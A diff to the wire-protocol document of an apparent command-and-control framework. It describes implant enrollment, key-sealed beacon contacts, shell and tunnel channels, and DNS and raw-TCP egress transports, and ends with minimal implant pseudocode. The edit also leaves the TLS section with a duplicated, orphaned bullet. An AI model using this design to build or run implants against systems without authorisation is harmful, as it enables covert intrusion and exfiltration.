@@ -19,35 +19,34 @@ the code win and this file is a bug.
 
 ### Endpoints
 
-A deployment exposes five implant-facing endpoints (listener configuration,
-architecture.md Sec 8):
+A deployment exposes its implant-facing endpoints by family (listener
+configuration, architecture.md Sec 8 -- the settled four-family surface):
 
 | Purpose | Transport | Route |
 |---------|-----------|-------|
 | Enroll | Plain HTTP(S), anonymous | `POST /implants/enroll` |
-| Enroll (QUIC) | QUIC (TLS 1.3), token-identified | `quic://host:port`, ALPN `rod1` |
-| Beacon / tasking (stream) | gRPC over mutual TLS | `/rod.v1.Beacon/Contact` |
 | Beacon / tasking (envelope) | Plain HTTP(S) POST, key-authenticated | `POST /implants/beacon` |
 | Beacon / tasking (WebSocket) | Plain HTTP(S) upgrade, key-authenticated | `GET /implants/beacon/stream` |
-| Beacon / tasking (QUIC stream) | QUIC (TLS 1.3), handshake-identified | `quic://host:port`, ALPN `rod1` |
+| Enroll + beacon (socket) | Raw TCP, handshake-identified | `tcp://host:port` |
+| Enroll + beacon (datagram) | DNS TXT, id-identified | `dns://resolver/zone` (DoH: RFC 8484) |
 
 The enroll listener accepts plain JSON with no client certificate -- the
 implant authenticates with the one-use stager token, not a cert it does not
-have yet. The stream listener requires a client certificate that chains to
-the engagement CA (enrollment is what mints it); the envelope route is the
-web transports' poll shape, authenticated by the per-artifact key the build
-baked -- no TLS client certificate anywhere on it. The beacon shapes carry
-the same frames -- the streams (gRPC, WebSocket, QUIC) are the interactive
-shape (server-push tasking, live channels), the envelope the poll shape that
-needs no gRPC stack.
+have yet. Every contact route is authenticated by the per-artifact key the
+build baked -- no TLS client certificate exists anywhere in the surface.
+The beacon shapes carry the same frames -- the held connections (the
+WebSocket beacon, the socket family's live mode) are the interactive shape
+(server-push tasking, live channels), the poll shapes (the envelope cycle,
+the socket family's per-cycle connections, the DNS TXT exchange) carry the
+interactive verbs store-and-forward.
 
 ### TLS shape
 
-- **Stream client certificate:** the leaf issued at enroll, paired with the
-  implant's own private key. It binds `(implant_id, engagement_id)` -- the
-  server's authoritative identity check is "the cert's engagement equals the
-  enrolled implant's engagement" (architecture.md Sec 9). Only the mTLS
-  listener asks to see it; the `http`/`https` listeners never send a TLS
+- **Server identity:** the `https` fronts present the engagement CA's
+  server leaf; the implant pins chain-to-CA from the enrollment's CA
+  chain. No route anywhere asks for a TLS client certificate -- identity
+  is the per-artifact key at the application layer and the handshake id,
+  never a transport certificate (the retired mTLS posture).
   `CertificateRequest` (it is itself a fingerprint), and the envelope
   contact authenticates under the baked key instead.
 - **Server identity:** the teamserver presents the engagement CA certificate
@@ -98,11 +97,10 @@ timeout) are worth retrying with exponential backoff.
 
 ### The Contact stream
 
-One bidirectional gRPC stream, method `/rod.v1.Beacon/Contact`, protobuf
-messages defined in rod.proto. The unit that crosses the stream is `Frame`:
-an opaque `payload` plus, upstream only, a `kind` discriminator. The server's
-message cap is 2 MiB per frame; keep a single payload near or under 1 MiB and
-chunk anything larger.
+Every carriage carries the same protobuf messages defined in rod.proto. The
+unit that crosses them is `Frame`: an opaque `payload` plus, upstream only,
+a `kind` discriminator. Keep a single payload near or under 1 MiB and chunk
+anything larger.
 
 **Frame order:**
 
@@ -157,9 +155,8 @@ the implant's session across reconnects.
 
 ### The envelope contact (the web contact)
 
-`POST /implants/beacon` against any web listener (`http` and `https` fronts
-alike; an mTLS front serves it too, where the client certificate resolves
-first). The body is a sequence of rod.v1 `Frame` messages, each prefixed with
+`POST /implants/beacon` against any web listener (`http` and `https`
+fronts alike). The body is a sequence of rod.v1 `Frame` messages, each prefixed with
 its byte length as an unsigned protobuf varint -- the canonical
 delimited-stream shape every protobuf runtime ships -- sealed under the
 per-artifact key the build baked (below). One POST is one poll contact:
@@ -240,11 +237,11 @@ past the TLS-less wire is still ciphertext to a listener.
 
 `GET /implants/beacon/stream` against any web listener -- the same route
 family as enroll and the envelope, upgraded to a WebSocket. This is the web
-posture's interactive shape: the same live session the gRPC stream runs
-(server-push tasking the moment it is queued, `ChannelInput` frames flowing
-down while a channel runs) over a socket any HTTP client runtime can open,
-with the envelope's own authentication -- no gRPC stack, no TLS client
-certificate anywhere.
+posture's interactive shape: a live held session (server-push tasking the
+moment it is queued, `ChannelInput` frames flowing down while a channel
+runs) over a socket any HTTP client runtime can open, with the envelope's
+own authentication -- no protocol stack beyond the WebSocket, no TLS
+client certificate anywhere.
 
 The message grammar is the envelope's body grammar, message-shaped:
 
@@ -265,11 +262,11 @@ The message grammar is the envelope's body grammar, message-shaped:
   burns its own counter, exactly like a POST.
 
 The connection is the session's carrier, not the session: a disconnect ends
-the channel halves with it (channels are session-scoped, as on the gRPC
-stream) but the session itself stays live -- reconnect, re-handshake, and
-the queue continues. The frame contents, the handshake order, the signature
-and replay-nonce discipline, and the staged/channel grammar are identical to
-the gRPC stream's -- only the carriage changes. An implant that implements
+the channel halves with it (channels are session-scoped) but the session
+itself stays live -- reconnect, re-handshake, and the queue continues. The
+frame contents, the handshake order, the signature and replay-nonce
+discipline, and the staged/channel grammar are identical on every carriage
+-- only the carriage changes. An implant that implements
 the envelope needs a WebSocket client, a protobuf codec, and AES-256-GCM --
 the same bar the envelope sets, plus the socket.
 
@@ -325,7 +322,8 @@ complete until the channel ends. Flow:
 The channel is session-scoped: it lives on the Contact stream that carried
 its `TaskRequest`, and a stream drop ends it (kill the shell or close the
 tunnel; the task stays dispatched server-side). Input is not signed -- like a
-`StagedChunk` run it rides the mTLS stream the signed `TaskRequest` opened.
+`StagedChunk` run it rides the authenticated carriage the signed
+`TaskRequest` opened.
 Keep output chunks at or under 16 KiB. The server routes `ChannelInput` only
 for a task whose verb is one of these channel verbs (`shell.interact`,
 `tunnel.forward`); a channel task claims over every poll carrier under the
@@ -340,14 +338,16 @@ The transcript accumulates as UTF-8 text, so binary tunnel traffic renders
 with replacement characters -- the traffic's attribution is the task record
 and the summary, not byte fidelity in the transcript.
 
-### Stream contacts (named pipe / raw TCP, the no-egress transports)
+### Stream contacts (raw TCP, the no-egress transport)
 
-The SMB and TCP listeners carry the envelope's frames over a raw duplex
-stream -- a named pipe (`\\host\pipe\name`) for Windows segments without
-HTTP or DNS egress, or a plain TCP socket for segment networks that allow
-sockets but no HTTP shape. One connection is one poll contact:
+The TCP listener carries the envelope's frames over a raw duplex stream --
+a plain TCP socket for segment networks that allow sockets but no HTTP
+shape (and for Windows segments with no egress at all, the pivot model
+reaches deeper than any pipe: a parent implant fronts its children's
+tasking over the carriage it already holds). One connection is one poll
+contact:
 
-1. Connect to the entry's public endpoint (the pipe path, or `host:port`).
+1. Connect to the entry's public endpoint (`host:port`).
 2. Write one request message: a varint byte length, then exactly that many
    bytes of the envelope's delimited frame sequence (the handshake frame
    first, then any results, exfil chunks, staged pulls, channel output).
@@ -366,24 +366,23 @@ with the implant id, engagement id, leaf certificate, CA chain, and --
 when the redeemed token names a build -- the per-artifact contact key;
 a refusal carries just the status, no signal beyond no). After an
 acceptance the ordinary handshake follows on the same connection, so a
-no-egress segment can enroll its first implant over the pipe or socket
-it already reaches; a client may also close after the enroll exchange
-and contact on fresh connections. A baked per-artifact key seals the
-whole carriage -- the enroll exchange and every contact message are
-AES-256-GCM under it (the contact body wrapping a fresh big-endian
-counter the server floors; each direction under its own purpose tag), the
-same seal the cleartext http posture carries, so a bare wire leaks no
-frame bytes. The reference implant's socket module
-carries all of it: the dial shapes are `tcp://host:port` and
-`smb://host/pipe/name` (a dot host is the local machine), and the contact
-cycle is the envelope's own request/response shape over the message framing,
-with the interactive verbs on the shared store-and-forward carriage.
+no-egress segment can enroll its first implant over the socket it already
+reaches; a client may also close after the enroll exchange and contact on
+fresh connections. A baked per-artifact key seals the whole carriage --
+the enroll exchange and every contact message are AES-256-GCM under it
+(the contact body wrapping a fresh big-endian counter the server floors;
+each direction under its own purpose tag), the same seal the cleartext
+http posture carries, so a bare wire leaks no frame bytes. The reference
+Rust implant's raw-TCP carriage carries all of it: the dial shape is
+`tcp://host:port`, and the contact cycle is the envelope's own
+request/response shape over the message framing, with the interactive
+verbs on the shared store-and-forward carriage.
 
 **The stream mode (the held live session).** A stream-mode bake over these
 fronts holds the connection instead of cycling it: the handshake advertises
 the `channels.live` capability, the server answers the handshake response as
 its own message, and the connection then runs the live session the web
-WebSocket beacon and the QUIC session run -- queued tasking pushed as its
+WebSocket beacon runs -- queued tasking pushed as its
 own message the moment it is issued (no request preceding it), result and
 channel-output messages sent as they happen, live channels for the
 streaming verbs, staged pulls answered by pushed chunk runs. A dropped
@@ -405,82 +404,17 @@ connection's response as `ChannelInput` frames, channel output batches
 upstream like any other frame. Oversized or malformed messages drop the
 connection without an answer.
 
-### The QUIC stream (UDP egress, the duplex socket transport)
+### The retired families (QUIC, SMB, mTLS gRPC)
 
-The QUIC listener carries the live session over a QUIC connection -- for
-egress that passes UDP/443 (where HTTP/3-era traffic lives) but blocks TCP.
-It is the interactive tier over a datagram egress: server-push tasking the
-moment it is queued, `ChannelInput` frames flowing down while a channel
-runs, the same session the gRPC stream and the WebSocket beacon hold. A
-build names a QUIC listener as its beacon and the baked endpoint carries the
-transport's own scheme (`quic://host:port`) -- the dial shape picks the
-client. Either mode bakes: stream holds the session open; poll ends each
-cycle when the tasking queue drains inside a short idle window (250 ms),
-sleeps the baked cadence, and reconnects -- one session per contact, the
-session surviving server-side across the disconnects. A poll run carries
-the interactive verbs store-and-forward on its cycles, the same shared
-discipline every poll client runs.
-
-The carriage is one connection, one client-initiated bidirectional stream,
-one session:
-
-1. Dial the entry's public endpoint over QUIC with ALPN `rod1`, TLS 1.3,
-   pinning chain-to-CA exactly like every other dial (the QUIC front
-   presents the engagement CA's server leaf and requests no client
-   certificate -- the web posture's fingerprint rule; QUIC cannot ride
-   cleartext at all).
-2. Open one bidirectional stream and speak first: one message -- a varint
-   byte length, then the envelope's delimited frame sequence with the
-   handshake `Frame` alone (any further frames in the message are ingested
-   as upstream traffic, the envelope's order).
-3. Read one response message: the same shape, the handshake response frame
-   first. A non-OK status is the only frame and the connection ends,
-   permanent as on every transport.
-4. Hold the stream: every later message is the same delimited sequence, one
-   frame per message downstream (a pushed `TaskRequest`, a `StagedChunk`
-   run, a `ChannelInput` unit) and whatever sequence the implant batches
-   upstream (results, exfil chunks, staged pulls, channel output).
-5. On a drop, reconnect and re-handshake: the session survives the
-   connection server-side, the same reconnect semantics the other stream
-   clients keep. Send QUIC keep-alives (the reference client pings every
-   30s) -- the listener drops a connection silent past two minutes.
-
-**Enrollment over the QUIC stream.** The opening stream's first exchange may
-be an enroll instead of a handshake -- the full-independence step
-(architecture.md Sec 8): an implant whose baked enroll endpoint is
-quic-schemed needs no HTTP shape at all. Where step 2 above would send the
-handshake `Frame`, send instead a `Frame` with kind
-`FRAME_KIND_ENROLL_REQUEST` whose payload is an `EnrollRequest` message --
-the same enroll body the web route carries as JSON (token secret, class, the
-implant's public key as a DER SubjectPublicKeyInfo, parent, host facts, kill
-date), promoted into the frame grammar. The server answers one message: a
-`Frame` with kind `FRAME_KIND_ENROLL_RESPONSE` carrying an `EnrollResponse`.
-On a non-OK status that frame is the only answer and the connection ends,
-the same statuses the web route's 401s carry; on OK the frame carries the
-new identity (implant id, engagement), the leaf certificate and CA chain as
-raw bytes, the echoed parent, and -- when the redeemed token's build minted
-one -- the per-artifact contact key (`envelope_key_id` is the 16-byte key
-id, `envelope_key` the 32-byte AES-256 key, the same packed halves the baked
-envelope key carries as base64). The ordinary handshake follows immediately
-on the same stream with the identity the enroll issued: one connection
-carries enroll-then-session, and every reconnect carries the handshake
-alone. The listener scopes the exchange to its own engagement -- a token
-minted for another engagement is refused whole and unspent -- with the same
-refusal rules and audit arc the web enroll route applies. The reference
-implant's QUIC enroll client requires the pinned CA (the bake always pins
-one); the QUIC dial has no system-root fallback.
-
-The identity is the certificate-less posture the pipe and raw TCP carry: no
-client certificate is requested anywhere, so the implant is identified by
-the id in its handshake, with the enrolled, kill-date, and retired gates
-applying in full; dispatched tasking keeps the complete signature posture.
-The message budget is the envelope's wire-body cap (16 MiB); a malformed or
-oversized message drops the connection without an answer. The transport
-needs a QUIC stack on the host (one ships with current Windows and macOS;
-Linux needs libmsquic) -- the listener refuses its bind without one and the
-reference client terminates with the cause. Channels are session-scoped as
-on every stream: the connection's end closes the channel halves with it.
-
+The QUIC duplex socket transport, the SMB named-pipe transport, and the
+mTLS-terminated gRPC stream are retired from the in-tree surface
+(architecture.md Sec 8's four-family decision). The frozen wire contract
+keeps what they owned: the enroll-exchange frame kinds stay reserved in
+rod.v1's `FrameKind`, the message grammars above carry unchanged, and a
+community unit reviving a family registers a transport provider against
+the same contracts -- the listener registry, the carrier table, and the
+bake parser all take new registrations without core edits
+([transports.md](transports.md)).
 ### DNS contacts (Tier 2, the egress-restricted transport)
 
 A DNS listener entry answers TXT queries over UDP under its zone (the entry's
@@ -570,7 +504,7 @@ token names no build, so its exchange rides plaintext and the key arrives in
 the answer. The whole lifecycle rides the one carrier -- the lightweight
 implant a DNS-only target runs.
 
-The transport's identity tradeoff is deliberate: no handshake and no mTLS ride
+The transport's identity tradeoff is deliberate: no handshake rides
 the DNS contact path -- an implant is identified by its id alone on polls
 and results (the sealed enroll exchange authenticates by key possession).
 Downstream tasking keeps the full
@@ -660,9 +594,8 @@ The smallest implant that enrolls, contacts, and executes tasking:
 1. **Enroll.** Generate an ECDSA P-256 key pair. POST the public key with the
    stager token. Receive the ids, the leaf, and the CA chain. Keep the private
    key; never transmit it.
-2. **Beacon.** Open `/rod.v1.Beacon/Contact` over mTLS with the leaf -- or
-   POST the envelope route (`/implants/beacon`, above) with no gRPC stack:
-   the default build bakes a per-artifact key, and every contact body seals
+2. **Beacon.** POST the envelope route (`/implants/beacon`, above): the
+   default build bakes a per-artifact key, and every contact body seals
    under it covering a fresh counter (a lab build with protection off sends
    the plaintext frames, on the cleartext front only).
 3. **Handshake.** Send the `HandshakeRequest` first; require OK; treat every
@@ -679,15 +612,15 @@ key    = ecdsa_p256()
 enroll = post_json("https://teamserver/implants/enroll",
                    {"stagerTokenSecret": token,
                     "publicKey": b64(key.spki_der)})
-leaf   = cert(enroll.leafCertificate) paired with key
 cas    = [cert(b) for b in enroll.caChain]
 
 forever:
-    # The envelope alternative drops the gRPC stack entirely: one HTTP(S) POST
-    # to /implants/beacon per cycle, the frames sealed (counter || frames)
-    # under the baked key, the response opened the same way.
-    stream = grpc_connect("teamserver:port", mTLS(leaf, trust = chain_to(cas)))
-    send Frame(payload = HandshakeRequest{1, 0, enroll.implantId, my_verbs})
+    # One HTTP(S) POST to /implants/beacon per cycle: the frames sealed
+    # (counter || frames) under the baked key, the response opened the
+    # same way.
+    body = seal(counter++ || frames(HandshakeRequest{1, 0, enroll.implantId, my_verbs}))
+    answer = post("https://teamserver/implants/beacon", body)
+    frames = open(answer)
     if HandshakeResponse.parse(recv()).status != OK: exit
 
     while task = TaskRequest.parse(next_downstream_frame()):
@@ -809,24 +742,22 @@ Tier 0/Tier 1 example with switchable defects.
 
 ## Calibration note
 
-Tier 0's heaviest piece used to be the gRPC/HTTP-2 channel, not the crypto or
-the messages. The plain-HTTP envelope contact (above) shipped as the answer:
-the same rod.v1 frames carried as delimited sequences in ordinary HTTP
-request/response bodies, one POST per poll contact, so Tier 0 now needs only
-an HTTP client, a protobuf codec, and AES-256-GCM. Authentication moved to
-the application layer with it: the build bakes a per-artifact key, every
-contact body seals under it covering a fresh counter, and the web transports
-request no TLS client certificate at all -- so a Tier 0 implant also needs no
-TLS client-certificate machinery on the web front, and the cleartext `http`
-posture carries confidential content. The
-gRPC stream remains the interactive shape -- server-push tasking the moment
-it is queued, and the live channels -- so an implant that wants
-`shell.interact` still wants the stream; an implant that only polls has no
-reason to carry a gRPC stack at all.
+Tier 0 needs only an HTTP client, a protobuf codec, and AES-256-GCM: the
+rod.v1 frames carried as delimited sequences in ordinary HTTP
+request/response bodies, one POST per poll contact. Authentication lives
+at the application layer: the build bakes a per-artifact key, every
+contact body seals under it covering a fresh counter, and no transport
+requests a TLS client certificate anywhere -- the cleartext `http`
+posture carries confidential content. The held connections (the WebSocket
+beacon on a web front, the socket family's live mode) remain the
+interactive shape -- server-push tasking the moment it is queued, and the
+live channels -- so an implant that wants `shell.interact` upgrades to a
+WebSocket client; an implant that only polls never opens one.
 
-The reference .NET implant made the same cut: an artifact built against an
-`http`/`https` front with no beacon named contacts over the envelope POST
-cycle on that front's own port (the mainstream single-port web shape), and
-only an mTLS-shaped build dials the gRPC stream -- so the wire contract this
-document describes is the one the reference implant itself runs on the web
-transports.
+The reference Rust implant runs exactly this cut: an artifact built
+against an `http`/`https` front with no beacon named contacts over the
+envelope POST cycle on that front's own port (the mainstream single-port
+web shape; a stream-mode build holds the WebSocket beacon on the same
+front), and the socket or datagram dials carry their own sections above
+-- the wire contract this document describes is the one the reference
+implant itself runs on every family.
